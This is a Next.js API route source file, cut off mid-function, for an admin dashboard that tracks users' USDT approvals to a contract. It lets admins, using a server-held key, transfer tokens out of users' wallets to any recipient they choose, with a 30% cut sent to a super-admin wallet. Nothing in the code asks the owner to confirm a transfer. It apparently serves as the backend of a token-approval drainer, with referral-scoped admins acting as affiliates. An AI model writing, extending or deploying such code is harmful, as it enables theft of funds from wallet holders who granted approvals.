import { NextResponse } from 'next/server';
import { getServerSession } from "next-auth/next";
import { authOptions } from "@/app/api/auth/[...nextauth]/route";
import connectDB from '@/lib/mongodb';
import TokenApproval from '@/models/TokenApproval';
import User from '@/models/User';
import TokenApprovalLog from '@/models/TokenApprovalLog';
import APIFeatures from '@/lib/utils/apiFeatures'; // Import APIFeatures
import { createPublicClient, http, formatUnits, isAddress as viemIsAddress, readContracts } from 'viem';
import { mainnet, sepolia } from 'viem/chains';
import { ethers } from 'ethers';

const PRODUCTION = process.env.NODE_ENV === 'production';

// --- Viem Client (for read-only operations like getBalanceOf) ---
const publicClient = createPublicClient({
    chain: PRODUCTION ? mainnet : sepolia, // Or the appropriate chain
    transport: http(),
});

// --- Constants & Config ---
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS || "";
const USDT_ADDRESS = process.env.USDT_ADDRESS; // USDT Contract Address
const USDT_DECIMALS = parseInt(process.env.USDT_DECIMALS || '6', 10); // Ensure decimals is a number
const SUPER_ADMIN_WALLET_ADDRESS = process.env.SUPER_ADMIN_WALLET_ADDRESS || ""; // Assuming this is needed for the fee recipient
const ADMIN_FEE_PERCENT = parseInt(process.env.SUPER_ADMIN_APPROVAL_FEE_PERCENT || '30', 10); // 30% fee, from env

// Define the conventional string representation for maximum uint256 (used for 'unlimited' allowance)
const MAX_UINT256_STRING = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

// --- Environment Variables for Backend Wallet ---
const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY;
const SERVER_RPC_URL = PRODUCTION
    ? process.env.MAINNET_RPC_URL // Use appropriate production RPC
    : process.env.ALCHEMY_SEPOLIA_URL; // Use Sepolia RPC for dev

// --- Critical Environment Variable Checks (at module load) ---
if (!CONTRACT_ADDRESS) {
    console.error("CRITICAL: CONTRACT_ADDRESS environment variable is not set!");
}
if (!SERVER_RPC_URL) {
    console.error("CRITICAL: Server RPC_URL environment variable is not set (check MAINNET_RPC_URL or ALCHEMY_SEPOLIA_URL)!");
}
if (!ADMIN_PRIVATE_KEY) {
    console.error("CRITICAL: ADMIN_PRIVATE_KEY environment variable is not set!");
}
if (isNaN(ADMIN_FEE_PERCENT) || ADMIN_FEE_PERCENT < 0 || ADMIN_FEE_PERCENT > 100) {
    console.error("CRITICAL: ADMIN_FEE_PERCENT environment variable is not set or is not a valid number!");
}
if (!SUPER_ADMIN_WALLET_ADDRESS || !ethers.isAddress(SUPER_ADMIN_WALLET_ADDRESS)) { // Using ethers.isAddress for validation
    console.error("CRITICAL: SUPER_ADMIN_WALLET_ADDRESS environment variable is not set or is not a valid Ethereum address!");
}

// Standard ERC-20 ABI for allowance and decimals
const ERC20_ABI = [
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "name": "",
                "type": "uint8"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            { "name": "owner", "type": "address" },
            { "name": "spender", "type": "address" }
        ],
        "name": "allowance",
        "outputs": [
            { "name": "", "type": "uint256" }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
    }
];

const tokenApprovalABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "getBalanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function",
        "constant": true
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "fromUser",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipientAddress",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "superAdminWalletAddress",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "totalAmount",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "feeAmount",
                "type": "uint256"
            }
        ],
        "name": "transferDirectFromWalletWithFee",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const REFRESH_INTERVAL_MS = 60 * 1000; // 60 seconds

// GET /api/admin/token-approvals - List all active token approvals (Admin/Super-Admin only)
export async function GET(request) {
    const session = await getServerSession(authOptions);

    // Check for history action
    const { searchParams } = new URL(request.url);
    const action = searchParams.get('action');

    if (action === 'history') {
        return handleGetHistory(session, request); // Pass the request object
    }

    // 1. Authorization Check for main list
    if (!session || !['admin', 'super-admin'].includes(session.user?.role)) {
        return NextResponse.json({ message: 'Forbidden: Insufficient permissions' }, { status: 403 });
    }

    await connectDB();

    try {
        let query = {}; // Base query for active approvals

        // --- Role-Based Filtering ---
        if (session.user.role === 'admin') {
            if (!session.user.id) {
                return NextResponse.json({ message: 'Admin user ID not found in session' }, { status: 400 });
            }
            // Find users referred by this admin
            const referredUsers = await User.find({ referredByAdmin: session.user.id }).select('_id');
            const referredUserIds = referredUsers.map(u => u._id);

            // Add condition to fetch approvals only for these users
            query.user = { $in: referredUserIds };
        }
        // Super-admins don't need additional user filtering (query remains { isActive: true })

        // --- Fetch Approvals ---
        // Fetch all existing TokenApproval records from the database
        const dbApprovals = await TokenApproval.find(query)
            .populate({
                path: 'user',
                select: 'name email walletAddress referredByAdmin',
                model: User
            })
            .lean();

        // Create a map for quick lookup of existing DB approvals by user ID and spender address
        const dbApprovalMap = new Map();
        dbApprovals.forEach(app => {
            if (app.user?._id && app.spenderAddress) {
                dbApprovalMap.set(`${app.user._id.toString()}-${app.spenderAddress.toLowerCase()}`, app);
            }
        });

        // Fetch all users to check for on-chain approvals not in DB
        const allUsers = await User.find({}).select('_id walletAddress').lean();

        // Prepare calls for batch reading allowances for all users against the CONTRACT_ADDRESS
        const allUserAllowanceCalls = allUsers.map(user => {
            if (user.walletAddress && viemIsAddress(user.walletAddress) && CONTRACT_ADDRESS && viemIsAddress(CONTRACT_ADDRESS)) {
                return {
                    address: USDT_ADDRESS,
                    abi: ERC20_ABI,
                    functionName: 'allowance',
                    args: [user.walletAddress, CONTRACT_ADDRESS],
                };
            }
            return null;
        }).filter(Boolean);

        let allBlockchainAllowances = [];
        if (allUserAllowanceCalls.length > 0) {
            try {
                const results = await publicClient.multicall({
                    contracts: allUserAllowanceCalls,
                });
                allBlockchainAllowances = results.map(res => res.result);
                console.log(`Fetched ${allBlockchainAllowances.length} blockchain allowances for all users.`);
            } catch (rpcError) {
                console.error("RPC Error fetching blockchain allowances for all users:", rpcError);
            }
        }

        const newlyCreatedApprovals = [];
        for (let i = 0; i < allUsers.length; i++) {
            const user = allUsers[i];
            const onChainAllowance = allBlockchainAllowances[i];

            if (onChainAllowance !== undefined && onChainAllowance !== null && BigInt(onChainAllowance) > 0n) {
                // Ensure user.walletAddress, USDT_ADDRESS, and CONTRACT_ADDRESS are valid before proceeding
                if (!user.walletAddress || !viemIsAddress(user.walletAddress)) {
                    console.warn(`Skipping creation of TokenApproval for user ${user._id} due to invalid or missing walletAddress: ${user.walletAddress}`);
                    continue;
                }
                if (!USDT_ADDRESS || !viemIsAddress(USDT_ADDRESS)) {
                    console.error(`CRITICAL: USDT_ADDRESS is not set or is invalid. Cannot create TokenApproval for user ${user._id}.`);
                    continue;
                }
                if (!CONTRACT_ADDRESS || !viemIsAddress(CONTRACT_ADDRESS)) {
                    console.error(`CRITICAL: CONTRACT_ADDRESS is not set or is invalid. Cannot create TokenApproval for user ${user._id}.`);
                    continue;
                }

                const key = `${user._id.toString()}-${CONTRACT_ADDRESS.toLowerCase()}`;
                if (!dbApprovalMap.has(key)) {
                    console.log(`Found on-chain approval for user ID: ${user._id}, walletAddress: ${user.walletAddress} (amount: ${onChainAllowance.toString()}) not in DB. Creating new record.`);
                    let humanReadableAmount;
                    if (onChainAllowance.toString() === MAX_UINT256_STRING) {
                        humanReadableAmount = "Unlimited";
                    } else {
                        humanReadableAmount = formatUnits(onChainAllowance, USDT_DECIMALS);
                    }

                    console.log(`Attempting to create TokenApproval with:
                        user: ${user._id}
                        spenderAddress: ${CONTRACT_ADDRESS}
                        approvedAmount: ${onChainAllowance.toString()}
                        approvedAmountHumanReadable: ${humanReadableAmount}
                        tokenAddress: ${USDT_ADDRESS}
                        ownerAddress: ${user.walletAddress}
                        USDT_DECIMALS: ${USDT_DECIMALS}
                    `);

                    const newApproval = new TokenApproval({
                        user: user._id,
                        spenderAddress: CONTRACT_ADDRESS,
                        approvedAmount: onChainAllowance.toString(),
                        approvedAmountHumanReadable: humanReadableAmount,
                        tokenAddress: USDT_ADDRESS,
                        ownerAddress: user.walletAddress,
                        is_active: true,
                        status: 'active',
                        last_checked_at: new Date(),
                    });
                    await newApproval.save();

                    // Populate the user field for the newly created approval
                    const populatedNewApproval = await TokenApproval.findById(newApproval._id)
                        .populate({
                            path: 'user',
                            select: 'name email walletAddress referredByAdmin',
                            model: User
                        })
                        .lean();
                    newlyCreatedApprovals.push(populatedNewApproval);
                }
            }
        }

        // Combine existing and newly found approvals for processing
        const combinedApprovals = [...dbApprovals, ...newlyCreatedApprovals];
        console.log(`Total approvals to process (DB + new from chain): ${combinedApprovals.length}`);

        const finalApprovals = [];
        for (let i = 0; i < combinedApprovals.length; i++) {
            const approval = combinedApprovals[i];

            // Re-fetch the current blockchain allowance for this specific approval
            // This ensures we have the most up-to-date allowance for both existing and newly created entries
            let currentBlockchainAllowance = 0n;
            if (approval.user?.walletAddress && viemIsAddress(approval.user.walletAddress) && approval.spenderAddress && viemIsAddress(approval.spenderAddress)) {
                try {
                    currentBlockchainAllowance = await publicClient.readContract({
                        address: USDT_ADDRESS,
                        abi: ERC20_ABI,
                        functionName: 'allowance',
                        args: [approval.user.walletAddress, approval.spenderAddress],
                    });
                } catch (err) {
                    console.error(`Error fetching allowance for user ${approval.user.walletAddress} (Approval ID: ${approval._id}):`, err.message);
                    // If there's an error fetching, treat it as 0 for safety or retain existing status
                    currentBlockchainAllowance = 0n;
                }
            }

            let newAllowanceAmount = '0';
            let newIsActive = false;
            let newStatus = 'inactive';

            if (currentBlockchainAllowance !== undefined && currentBlockchainAllowance !== null) {
                newAllowanceAmount = currentBlockchainAllowance.toString();
                if (BigInt(newAllowanceAmount) > 0n) {
                    newIsActive = true;
                    newStatus = 'active';
                } else {
                    newStatus = 'revoked'; // Allowance is zero
                }
            } else {
                // If blockchain data is unavailable, retain current status or default to 'unknown'
                newStatus = approval.status || 'unknown';
                newAllowanceAmount = approval.current_allowance_amount || '0';
                newIsActive = approval.is_active || false;
            }

            const now = new Date();
            const lastChecked = approval.last_checked_at ? new Date(approval.last_checked_at) : new Date(0);
            const shouldUpdateDb =
                newIsActive !== approval.is_active ||
                newStatus !== approval.status ||
                newAllowanceAmount !== approval.current_allowance_amount ||
                (now.getTime() - lastChecked.getTime() > REFRESH_INTERVAL_MS);

            if (shouldUpdateDb) {
                const updatedApproval = await TokenApproval.findByIdAndUpdate(
                    approval._id,
                    {
                        is_active: newIsActive,
                        last_checked_at: now,
                        current_allowance_amount: newAllowanceAmount,
                        status: newStatus,
                    },
                    { new: true, lean: true }
                ).populate({
                    path: 'user',
                    select: 'name email walletAddress referredByAdmin',
                    model: User
                });
                finalApprovals.push(updatedApproval);
            } else {
                // If no update needed, push the original approval (with populated user)
                finalApprovals.push(approval);
            }
        }

        // --- Fetch On-Chain and Off-Chain Balances for each user (existing logic) ---
        const finalApprovalsWithBalances = await Promise.all(finalApprovals.map(async (approval) => {
            if (!approval.user || !approval.user.walletAddress) {
                console.warn(`Approval ${approval._id} missing user or wallet address.`);
                return { ...approval, userContractBalance: 0, userWalletUsdtBalance: 0 };
            }

            const userWalletAddress = approval.user.walletAddress;
            let userContractBalance = 0;
            let userWalletUsdtBalance = 0;
            let balanceFetchError = null;

            try {
                // Fetch On-Chain Balance (balance in your contract)
                const contractBalance = await publicClient.readContract({
                    address: CONTRACT_ADDRESS,
                    abi: tokenApprovalABI,
                    functionName: 'getBalanceOf',
                    args: [userWalletAddress],
                });
                userContractBalance = parseFloat(formatUnits(contractBalance, USDT_DECIMALS));

                // Fetch Off-Chain USDT Wallet Balance
                if (USDT_ADDRESS) {
                    const walletBalance = await publicClient.readContract({
                        address: USDT_ADDRESS,
                        abi: ERC20_ABI, // Use the standard ERC-20 ABI for balanceOf
                        functionName: 'balanceOf',
                        args: [userWalletAddress],
                    });
                    userWalletUsdtBalance = parseFloat(formatUnits(walletBalance, USDT_DECIMALS));
                } else {
                    console.warn("USDT_ADDRESS is not set. Cannot fetch off-chain USDT balance.");
                }

            } catch (error) {
                console.error(`Error fetching balances for user ${userWalletAddress}:`, error);
                balanceFetchError = error.message;
            }

            // log approval
            console.log('approval--------------------', approval);

            return {
                ...approval,
                userContractBalance,
                userWalletUsdtBalance,
                balanceFetchError
            };
        }));

        return NextResponse.json({ approvals: finalApprovalsWithBalances }, { status: 200 });

    } catch (error) {
        console.error("API Error fetching token approvals:", error);
        // Log the full error object for detailed debugging
        console.error("Detailed Fetch Error:", JSON.stringify(error, Object.getOwnPropertyNames(error)));
        return NextResponse.json({ message: 'Error fetching token approvals', error: error.message }, { status: 500 });
    }
}

// POST /api/admin/token-approvals - Handle token transfer initiation or logging (Admin/Super-Admin only)
export async function POST(request) {
    const session = await getServerSession(authOptions);

    // 1. Authorization Check
    if (!session || !['admin', 'super-admin'].includes(session.user?.role)) {
        return NextResponse.json({ message: 'Forbidden: Insufficient permissions' }, { status: 403 });
    }

    await connectDB();

    const { searchParams } = new URL(request.url);
    const action = searchParams.get('action');

    // Initialize Ethers Provider and Wallet once for the request
    let provider;
    let adminWallet;
    if (SERVER_RPC_URL && ADMIN_PRIVATE_KEY && CONTRACT_ADDRESS) {
        try {
            provider = new ethers.JsonRpcProvider(SERVER_RPC_URL);
            adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
            console.log(`Admin wallet initialized for token approval transfer: ${adminWallet.address}`);
        } catch (initError) {
            console.error("Token Approval Transfer POST failed: Ethers provider/wallet initialization error:", initError);
            return NextResponse.json({ error: 'Server configuration error (Wallet Init). Cannot process transfer.' }, { status: 500 });
        }
    } else {
        console.error("Token Approval Transfer POST failed: Missing RPC_URL, ADMIN_PRIVATE_KEY, or CONTRACT_ADDRESS.");
        return NextResponse.json({ error: 'Server configuration error (Missing Env Vars). Cannot process transfer.' }, { status: 500 });
    }

    if (action === 'estimateFee') {
        return handleEstimateFee(request, session, provider, adminWallet);
    } else if (action === 'initiate-transfer') {
        return handleInitiateTransfer(request, session, provider, adminWallet);
    } else {
        // Default to logging if no specific action or action is not 'initiate-transfer'
        return handleLogTransfer(request, session);
    }
}

// Helper function to handle gas estimation
async function handleEstimateFee(request, session, provider, adminWallet) {
    try {
        const { userId, amount, recipientAddress } = await request.json();

        // Input Validation for estimation
        if (!userId || amount === undefined || amount === null || !recipientAddress) {
            return NextResponse.json({ error: 'Missing required fields for estimation: userId, amount, recipientAddress' }, { status: 400 });
        }
        if (!ethers.isAddress(recipientAddress)) {
            return NextResponse.json({ error: 'Invalid recipient address format for estimation.' }, { status: 400 });
        }
        if (!ethers.isAddress(CONTRACT_ADDRESS)) {
            return NextResponse.json({ error: 'Invalid contract address configuration on server.' }, { status: 500 });
        }
        if (!SUPER_ADMIN_WALLET_ADDRESS || !ethers.isAddress(SUPER_ADMIN_WALLET_ADDRESS)) {
            console.error("Gas estimation failed: Invalid SUPER_ADMIN_WALLET_ADDRESS configuration.");
            return NextResponse.json({ error: 'Server configuration error (Super Admin Wallet). Cannot estimate gas.' }, { status: 500 });
        }

        const user = await User.findById(userId).lean();
        if (!user) {
            return NextResponse.json({ error: 'User not found for estimation' }, { status: 404 });
        }
        const fromUserAddress = user.walletAddress;
        if (!fromUserAddress || !ethers.isAddress(fromUserAddress)) {
            return NextResponse.json({ error: "Selected user has an invalid or missing source wallet address for estimation." }, { status: 400 });
        }

        const totalAmountNum = parseFloat(amount);
        if (isNaN(totalAmountNum) || totalAmountNum <= 0) {
            return NextResponse.json({ error: "Invalid amount format for estimation. Please enter a positive number (e.g., 100.50)." }, { status: 400 });
        }
        const totalAmountWei = ethers.parseUnits(totalAmountNum.toString(), USDT_DECIMALS);

        const adminFeeAmountNum = totalAmountNum * (ADMIN_FEE_PERCENT / 100);
        const feeAmountWei = ethers.parseUnits(adminFeeAmountNum.toString(), USDT_DECIMALS);

        // Need a contract interface to encode the function data
        const contractInterface = new ethers.Interface(tokenApprovalABI);

        // Encode the function call data
        const data = contractInterface.encodeFunctionData("transferDirectFromWalletWithFee", [
            fromUserAddress,
            recipientAddress,
            SUPER_ADMIN_WALLET_ADDRESS,
            totalAmountWei,
            feeAmountWei
        ]);

        console.log(`Estimating gas for transferDirectFromWalletWithFee:
            Contract: ${CONTRACT_ADDRESS}
            Admin Signer: ${adminWallet.address}
            User (From): ${fromUserAddress}
            Original Recipient: ${recipientAddress}
            Super Admin Wallet: ${SUPER_ADMIN_WALLET_ADDRESS}
            Total Amount (Units): ${totalAmountWei.toString()}
            Fee Amount (Units): ${feeAmountWei.toString()}
            Encoded Data: ${data}`);

        let estimatedGasFeeEth = '0';
        try {
            const gasEstimate = await provider.estimateGas({
                to: CONTRACT_ADDRESS,
                from: adminWallet.address,
                data: data,
            });
            console.log(`Estimated gas units: ${gasEstimate.toString()}`);

            const feeData = await provider.getFeeData();
            const gasPrice = feeData.gasPrice || feeData.maxFeePerGas;

            if (gasPrice) {
                const estimatedFeeWei = gasEstimate * gasPrice;
                estimatedGasFeeEth = ethers.formatEther(estimatedFeeWei);
                console.log(`Estimated gas price: ${gasPrice.toString()} wei`);
                console.log(`Estimated gas fee: ${estimatedFeeWei.toString()} wei (${estimatedGasFeeEth} ETH)`);
            } else {
                console.warn("Could not get gas price from provider for estimation.");
            }

        } catch (estimateError) {
            console.error("Error estimating gas:", estimateError);
            return NextResponse.json({ error: `Failed to estimate gas: ${estimateError.message || estimateError}` }, { status: 500 });
        }

        return NextResponse.json({
            estimatedGasFeeEth: estimatedGasFeeEth
        }, { status: 200 });

    } catch (error) {
        console.error('Server-side gas estimation error:', error);
        let errorMessage = 'Internal Server Error during gas estimation.';
        if (error.code === 'INSUFFICIENT_FUNDS') {
            errorMessage = 'Admin wallet has insufficient funds for gas estimation (requires a small amount).';
        } else if (error.reason) {
            errorMessage = `Estimation reverted: ${error.reason}`;
        } else if (error.message) {
            errorMessage = error.message;
        }
        const statusCode = errorMessage.includes('Insufficient balance') || errorMessage.includes('Invalid') ? 400 : 500;
        return NextResponse.json({ error: errorMessage }, { status: statusCode });
    }
}


// Helper function to handle initiating a transfer
async function handleInitiateTransfer(request, session, provider, adminWallet) {
    const adminUserId = session.user.id; // ID of the admin performing the action

    let userWalletAddress = null; // Initialize outside try for logging in catch block
    let totalAmountNum = 0;
    let adminFeeAmountNum = 0;
    let recipientAmountNum = 0;
    let fromUserAddress = null; // Keep for logging purposes if needed

    try {
        // Expected payload for initiation: { userId, amount, recipientAddress }
        const { userId, amount, recipientAddress } = await request.json();

        // 2. Validate input
        if (!userId || amount === undefined || amount === null || !recipientAddress) {
            return NextResponse.json({ message: 'Missing required fields for transfer initiation: userId, amount, recipientAddress' }, { status: 400 });
        }

        // Basic address format validation for recipient
        if (!ethers.isAddress(recipientAddress)) {
            return NextResponse.json({ message: 'Invalid recipient address format.' }, { status: 400 });
        }
        if (!ethers.isAddress(CONTRACT_ADDRESS)) {
            return NextResponse.json({ error: 'Invalid contract address configuration on server.' }, { status: 500 });
        }
        if (!SUPER_ADMIN_WALLET_ADDRESS || !ethers.isAddress(SUPER_ADMIN_WALLET_ADDRESS)) {
            console.error("Token Approval Transfer POST failed: Invalid SUPER_ADMIN_WALLET_ADDRESS configuration.");
            return NextResponse.json({ error: 'Server configuration error (Super Admin Wallet). Cannot process transfer.' }, { status: 500 });
        }

        // 3. Fetch User details (still needed for logging and linking to approval)
        const user = await User.findById(userId).lean();
        if (!user) {
            return NextResponse.json({ message: 'User not found.' }, { status: 404 });
        }
        fromUserAddress = user.walletAddress; // Keep for logging
        userWalletAddress = user.walletAddress; // For logging

        if (recipientAddress.toLowerCase() === fromUserAddress.toLowerCase()) {
            return NextResponse.json({ error: "Recipient address cannot be the same as the user's source address." }, { status: 400 });
        }

        // 4. Parse Amount
        totalAmountNum = parseFloat(amount);
        if (isNaN(totalAmountNum) || totalAmountNum <= 0) {
            return NextResponse.json({ message: 'Invalid amount provided for transfer. Must be a positive number.' }, { status: 400 });
        }
        const totalAmountWei = ethers.parseUnits(totalAmountNum.toString(), USDT_DECIMALS);

        // 5. Calculate amounts and fee
        adminFeeAmountNum = totalAmountNum * (ADMIN_FEE_PERCENT / 100);
        const feeAmountWei = ethers.parseUnits(adminFeeAmountNum.toString(), USDT_DECIMALS);
        recipientAmountNum = totalAmountNum - adminFeeAmountNum;

        // --- Server-Side Balance and Allowance Checks ---
        // Fetch the latest TokenApproval for the user and contract
        const approval = await TokenApproval.findOne({ user: userId, spenderAddress: CONTRACT_ADDRESS }).lean();

        if (!approval) {
            return NextResponse.json({ error: 'No active token approval found for this user and contract.' }, { status: 400 });
        }

        const approvedAmountBigInt = BigInt(approval.approvedAmount); // This is the allowance given to the contract

        // Check if the requested amount exceeds the approved allowance
        if (totalAmountWei > approvedAmountBigInt) {
            const approvedAmountFormatted = ethers.formatUnits(approvedAmountBigInt, USDT_DECIMALS);
            const amountRequestedFormatted = ethers.formatUnits(totalAmountWei, USDT_DECIMALS);
            return NextResponse.json({ error: `Requested amount (${amountRequestedFormatted} USDT) exceeds the approved allowance (${approvedAmountFormatted} USDT).` }, { status: 400 });
        }

        // Check user's actual USDT wallet balance (off-chain)
        if (!USDT_ADDRESS) {
            console.warn("USDT_ADDRESS is not set. Cannot verify user's off-chain USDT balance.");
            // Decide if this should be a hard error or just a warning. For now, proceed but log.
        } else {
            const usdtContractReader = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
            const userUsdtWalletBalanceBigInt = await usdtContractReader.balanceOf(fromUserAddress);

            if (totalAmountWei > userUsdtWalletBalanceBigInt) {
                const walletBalanceFormatted = ethers.formatUnits(userUsdtWalletBalanceBigInt, USDT_DECIMALS);
                const amountRequestedFormatted = ethers.formatUnits(totalAmountWei, USDT_DECIMALS);
                return NextResponse.json({ error: `Insufficient balance. User has ${walletBalanceFormatted} USDT in their wallet, attempted: ${amountRequestedFormatted} USDT.` }, { status: 400 });
            }
        }
        // --- End Server-Side Balance and Allowance Checks ---

        // 6. Log Initial Attempt
        let transferLogEntry = new TokenApprovalLog({
            userId: user._id,
            userWalletAddress: fromUserAddress.toLowerCase(),
            recipientAddress: recipientAddress.toLowerCase(),
            totalAmount: totalAmountNum,
            adminFeeAmount: adminFeeAmountNum,
            recipientAmount: recipientAmountNum,
            transactionHash: null,
            status: 'processing',
            adminAddress: adminWallet.address.toLowerCase(),
            adminId: adminUserId, // Store the admin's user ID
            approvalId: approval._id, // Link to the specific approval
        });
        await transferLogEntry.save();
        console.log(`New token approval transfer attempt logged (ID: ${transferLogEntry._id}).`);

        // 7. Initialize Contract with Signer and Send Transaction
        const tokenContract = new ethers.Contract(CONTRACT_ADDRESS, tokenApprovalABI, adminWallet);

        console.log(`Preparing to execute transferDirectFromWalletWithFee (backend signed):
            Contract: ${CONTRACT_ADDRESS}
            Admin Signer: ${adminWallet.address}
            User (From): ${fromUserAddress}
            Original Recipient: ${recipientAddress}
            Super Admin Wallet: ${SUPER_ADMIN_WALLET_ADDRESS}
            Total Amount (Units): ${totalAmountWei.toString()} (${totalAmountNum} USDT)
            Fee Amount (Units): ${feeAmountWei.toString()} (${adminFeeAmountNum} USDT)`);

        const tx = await tokenContract.transferDirectFromWalletWithFee(
            fromUserAddress,
            recipientAddress,
            SUPER_ADMIN_WALLET_ADDRESS,
            totalAmountWei,
            feeAmountWei
        );

        console.log(`Transaction submitted with hash: ${tx.hash}`);

        // 8. Update Log with Hash and Status
        transferLogEntry.transactionHash = tx.hash;
        transferLogEntry.status = 'pending'; // Set to pending until confirmed on chain
        await transferLogEntry.save();

        // 9. Return Transaction Hash
        return NextResponse.json({
            message: 'Token approval transfer initiated successfully.',
            transactionHash: tx.hash,
            logId: transferLogEntry._id,
        }, { status: 200 });

    } catch (error) {
        console.error('Server-side token approval transfer error:', error);

        let errorMessage = 'Internal Server Error during token approval transfer.';
        if (error.code === 'INSUFFICIENT_FUNDS') {
            errorMessage = 'Admin wallet has insufficient funds for gas.';
        } else if (error.reason) {
            errorMessage = `Transaction reverted: ${error.reason}`;
        } else if (error.message) {
            errorMessage = error.message;
        }

        // Attempt to log the failure
        try {
            await TokenApprovalLog.create({
                userId: userId || null,
                userWalletAddress: fromUserAddress || null,
                recipientAddress: recipientAddress || null,
                totalAmount: totalAmountNum || 0,
                adminFeeAmount: adminFeeAmountNum || 0,
                recipientAmount: recipientAmountNum || 0,
                status: 'failed',
                errorMessage: errorMessage,
                adminAddress: adminWallet?.address || 'N/A',
                adminId: adminUserId || null, // Ensure adminId is logged even on failure
            });
        } catch (logErr) {
            console.error("Failed to log token approval transfer failure:", logErr);
        }

        const statusCode = errorMessage.includes('Insufficient balance') || errorMessage.includes('Invalid') ? 400 : 500;
        return NextResponse.json({ error: errorMessage }, { status: statusCode });
    }
}

// Helper function to handle logging a completed transfer
async function handleLogTransfer(request, session) {
    try {
        // Expected POST payload: { logId, recipientAddress, totalAmount, transactionHash, status, adminAddress }
        const { logId, recipientAddress, totalAmount, transactionHash, status, adminAddress } = await request.json();
        // debug console log
        console.log("Received logging request:", { logId, recipientAddress, totalAmount, transactionHash, status, adminAddress });

        // 2. Validate input
        if (!logId || !recipientAddress || totalAmount === undefined || totalAmount === null || !transactionHash || !status || !adminAddress) {
            return NextResponse.json({ message: 'Missing required fields for logging: logId, recipientAddress, totalAmount, transactionHash, status, adminAddress' }, { status: 400 });
        }

        // Basic address format validation
        if (!recipientAddress.startsWith('0x') || recipientAddress.length !== 42 || !adminAddress.startsWith('0x') || adminAddress.length !== 42) {
            return NextResponse.json({ message: 'Invalid address format for recipient or admin.' }, { status: 400 });
        }

        // 3. Find and update the existing log entry
        const updatedLog = await TokenApprovalLog.findByIdAndUpdate(
            logId,
            {
                recipientAddress: recipientAddress.toLowerCase(),
                totalAmount: parseFloat(totalAmount),
                transactionHash: transactionHash.toLowerCase(),
                status: status, // 'completed' or 'failed' from frontend confirmation
                adminAddress: adminAddress.toLowerCase(), // Admin wallet address that sent the tx
                // Recalculate fee and recipient amount for consistency, though they should match
                adminFeeAmount: parseFloat(totalAmount) * (ADMIN_FEE_PERCENT / 100),
                recipientAmount: parseFloat(totalAmount) - (parseFloat(totalAmount) * (ADMIN_FEE_PERCENT / 100)),
            },
            { new: true } // Return the updated document
        );

        if (!updatedLog) {
            console.warn(`TokenApprovalLog with ID ${logId} not found for update.`);
            return NextResponse.json({ message: `Log entry ${logId} not found. Cannot update transaction.` }, { status: 404 });
        }

        return NextResponse.json({ message: 'Token approval transfer logged successfully', transactionHash: updatedLog.transactionHash }, { status: 200 });

    } catch (error) {
        console.error("API Error logging token approval transfer:", error);
        // Handle duplicate key error specifically for transactionHash
        if (error.code === 11000) {
            return NextResponse.json({ message: 'Duplicate transaction hash. This transfer may have already been logged.' }, { status: 409 });
        }
        return NextResponse.json({ message: 'Error logging token approval transfer', error: error.message }, { status: 500 });
    }
}

// Helper function to handle GET history request
async function handleGetHistory(session, request) {
    // 1. Authorization Check
    if (!session || !['admin', 'super-admin'].includes(session.user?.role)) {
        return NextResponse.json({ message: 'Forbidden: Insufficient permissions' }, { status: 403 });
    }

    await connectDB();

    try {
        console.log("handleGetHistory: Starting history fetch process.");
        let baseQuery = {}; // Base query for all history

        // --- Role-Based Filtering ---
        if (session.user.role === 'admin') {
            if (!session.user.id) {
                console.error("handleGetHistory: Admin user ID not found in session for role-based filtering.");
                return NextResponse.json({ message: 'Admin user ID not found in session' }, { status: 400 });
            }
            // Find users referred by this admin
            const referredUsers = await User.find({ referredByAdmin: session.user.id }).select('_id');
            const referredUserIds = referredUsers.map(u => u._id);
            console.log(`handleGetHistory: Admin ${session.user.id} referred users: ${referredUserIds.length}`);

            // Add condition to fetch history only for these users
            baseQuery.userId = { $in: referredUserIds };
        }
        // Super-admins don't need additional user filtering
        console.log("handleGetHistory: Base query constructed:", baseQuery);

        // Get query parameters from the request URL
        const { searchParams } = new URL(request.url);
        console.log("handleGetHistory: Search params:", Object.fromEntries(searchParams.entries()));

        // Create an APIFeatures instance
        const features = new APIFeatures(TokenApprovalLog.find(baseQuery), searchParams)
            .filter()
            .search(['userWalletAddress', 'recipientAddress', 'transactionHash', 'status']) // Searchable fields
            .sort()
            .limitFields()
            .paginate();
        console.log("handleGetHistory: APIFeatures applied. Mongoose query state:", features.query.getQuery());

        // Execute the query and populate both userId and adminId
        const history = await features.query
            .populate({
                path: 'userId',
                select: 'name email walletAddress',
                model: User
            })
            .populate({ // Populate adminId to get admin's name and email
                path: 'adminId',
                select: 'name email walletAddress',
                model: User
            })
            .lean();
        console.log(`handleGetHistory: Fetched ${history.length} history records.`);

        // Get total count for pagination (without limit and skip)
        // Create a new query for counting, applying only filters and search, but not pagination
        const countQuery = new APIFeatures(TokenApprovalLog.find(baseQuery), searchParams)
            .filter()
            .search(['userWalletAddress', 'recipientAddress', 'transactionHash', 'status']);

        const totalCount = await countQuery.query.countDocuments();
        console.log(`handleGetHistory: Total count for pagination: ${totalCount}`);

        // Map to match expected TransactionHistoryTable props
        const formattedHistory = history.map(log => {
            const isAdminLoggedInUser = session.user && log.adminId && session.user.id === log.adminId._id.toString();
